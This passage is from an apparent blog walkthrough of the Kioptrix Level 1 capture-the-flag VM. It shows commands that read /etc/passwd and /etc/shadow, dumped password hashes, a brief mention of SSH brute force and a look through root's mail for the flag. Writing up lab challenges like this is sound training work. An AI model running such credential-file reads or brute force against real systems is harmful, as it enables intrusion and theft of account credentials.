+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/var/spool/news:
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+mailnull:x:47:47::/var/spool/mqueue:/dev/null
+rpm:x:37:37::/var/lib/rpm:/bin/bash
+xfs:x:43:43:X Font Server:/etc/X11/fs:/bin/false
+rpc:x:32:32:Portmapper RPC user:/:/bin/false
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+nscd:x:28:28:NSCD Daemon:/:/bin/false
+ident:x:98:98:pident user:/:/sbin/nolcat /etc/passwd
+ogin
+radvd:x:75:75:radvd user:/:/bin/false
+postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
+apache:x:48:48:Apache:/var/www:/bin/false
+squid:x:23:23::/var/spool/squid:/dev/null
+pcap:x:77:77::/var/arpwatch:/bin/nologin
+john:x:500:500::/home/john:/bin/bash
+harold:x:501:501::/home/harold:/bin/bash
+
+cat /etc/shadow
+root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::
+bin:*:14513:0:99999:7:::
+daemon:*:14513:0:99999:7:::
+adm:*:14513:0:99999:7:::
+lp:*:14513:0:99999:7:::
+sync:*:14513:0:99999:7:::
+shutdown:*:14513:0:99999:7:::
+halt:*:14513:0:99999:7:::
+mail:*:14513:0:99999:7:::
+news:*:14513:0:99999:7:::
+uucp:*:14513:0:99999:7:::
+operator:*:14513:0:99999:7:::
+games:*:14513:0:99999:7:::
+gopher:*:14513:0:99999:7:::
+ftp:*:14513:0:99999:7:::
+nobody:*:14513:0:99999:7:::
+mailnull:!!:14513:0:99999:7:::
+rpm:!!:14513:0:99999:7:::
+xfs:!!:14513:0:99999:7:::
+rpc:!!:14513:0:99999:7:::
+rpcuser:!!:14513:0:99999:7:::
+nfsnobody:!!:14513:0:99999:7:::
+nscd:!!:14513:0:99999:7:::
+ident:!!:14513:0:99999:7:::
+radvd:!!:14513:0:99999:7:::
+postgres:!!:14513:0:99999:7:::
+apache:!!:14513:0:99999:7:::
+squid:!!:14513:0:99999:7:::
+pcap:!!:14513:0:99999:7:::
+john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
+harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::
+</code></pre>
+<p>And... Winner, winner, rootshellz for dinner!  By chaining a remote code execution (RCE) exploit with a local privilege escalation exploit we have achieved our goal.</p>
+<h1 id="exploitation3ssh">Exploitation #3 - SSH</h1>
+<p>I couldn't seem to identify any exact matches of RCE exploits for OpenSSH 2.9p2.  However, every version of SSH is always vulnerable to at least one exploit: brute force!  I didn't spend the time trying to brute force my way in, but it is definitely possible this is a possible solution.</p>
+<h1 id="pillaging">Pillaging</h1>
+<p>Looking through the output of my enumeration script, I noticed something of note:</p>
+<pre><code class="language-shell-output">ls -l /var/mail/
+total 1
+-rw-rw----    1 harold   harold          0 Sep 26  2009 harold
+-rw-rw----    1 john     john            0 Sep 26  2009 john
+-rw-rw----    1 nfsnobod nfsnobod        0 Sep 26  2009 nfsnobody
+-rw-------    1 root     root         1005 Aug 16 00:06 root
+</code></pre>
+<p>Mr. root had some mail.</p>
+<pre><code class="language-shell-output">file /var/mail/root
+/var/mail/root: ASCII mail text
+
+cat /var/mail/root
+From root  Sat Sep 26 11:42:10 2009
+Return-Path: &lt;root@kioptix.level1&gt;
+Received: (from root@localhost)
+  by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831
+  for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400
+Date: Sat, 26 Sep 2009 11:42:10 -0400
+From: root &lt;root@kioptix.level1&gt;
+Message-Id: &lt;200909261542.n8QFgAZ01831@kioptix.level1&gt;
+To: root@kioptix.level1
+Subject: About Level 2
+Status: O
+
+If you are reading this, you got root. Congratulations.
+Level 2 won't be as easy...
+
+From root  Wed Aug 16 00:06:45 2017
+Return-Path: &lt;root@kioptrix.level1&gt;
+Received: (from root@localhost)
+  by kioptrix.level1 (8.11.6/8.11.6) id v7G46js01139
+  for root; Wed, 16 Aug 2017 00:06:45 -0400
+Date: Wed, 16 Aug 2017 00:06:45 -0400
+From: root &lt;root@kioptrix.level1&gt;
+Message-Id: &lt;201708160406.v7G46js01139@kioptrix.level1&gt;
+To: root@kioptrix.level1
+Subject: LogWatch for kioptrix.level1
+
+
+
+ ################## LogWatch 2.1.1 Begin ##################### 
+
+
+ ###################### LogWatch End ######################### 
+</code></pre>
+<p>Looks like this was a flag:</p>
+<p>&quot;If you are reading this, you got root. Congratulations.<br>
+Level 2 won't be as easy...&quot;</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>This VM was simple and fun, a nice warm up for the Kioptrix series.  I was able to find two different RCE vulnerabilities, one in SMB and the other in mod_ssl / Apache.  I think the moral here, from a security standpoint, is patch all the things!  Stay tuned as I will continue to post about the Kioptrix series as I complete them.</p>
+<p>Also, in a future posts, I plan to dig deeper in to the exploits used in this and other challenges to really understand the vulnerabilities and how the exploits actually work.</p>
+<!--kg-card-end: markdown-->
+        </section>
+        
+        <div id="disqus_thread"></div>
+        <script type="text/javascript">
+            var disqus_shortname = d_id; 
+        
+            /* * * DON'T EDIT BELOW THIS LINE * * */
+            (function() {
+                var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+
+        <footer class="post-footer">
+
+
+            <section class="share">
+                <h4>Share this</h4>
+                <a class="icon-twitter" href="http://twitter.com/share?text=Kioptrix: Level 1 (#1) Walkthrough&url=https://blog.rootshellz.com/kioptrix-walkthrough-1/"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <span class="hidden">Twitter</span>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.rootshellz.com/kioptrix-walkthrough-1/"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <span class="hidden">Facebook</span>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=https://blog.rootshellz.com/kioptrix-walkthrough-1/"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <span class="hidden">Google+</span>
+                </a>
+            </section>
+
+        </footer>
+
+
+    </article>
+
+</main>
+
+
+    <footer class="site-footer">
+        <!-- <a class="subscribe icon-feed" href="https://blog.rootshellz.com/rss/"><span class="tooltip">Subscribe!</span></a> -->
+        <div class="inner">
+             <section class="copyright">All content copyright <a href="/">rootshellz</a> &copy; 2020 &bull; All rights reserved.</section>
+             <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://ghost.org"><span class="icon-ghost-text">Ghost</span></a> in <a href="https://github.com/mityalebedev/The-Shell">The Shell</a> theme.</section>
+        </div>
+    </footer>
+
+    <!-- https://cdnjs.com/libraries/prism -->
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.22.0/prism.min.js"></script>
+
+    <script type='text/javascript' src="/assets/highlighter/prettify.js?v=8d33012fb0"></script>
+    <script type='text/javascript' src="/assets/js/shell.js?v=8d33012fb0"></script>
+</body>
+</html>
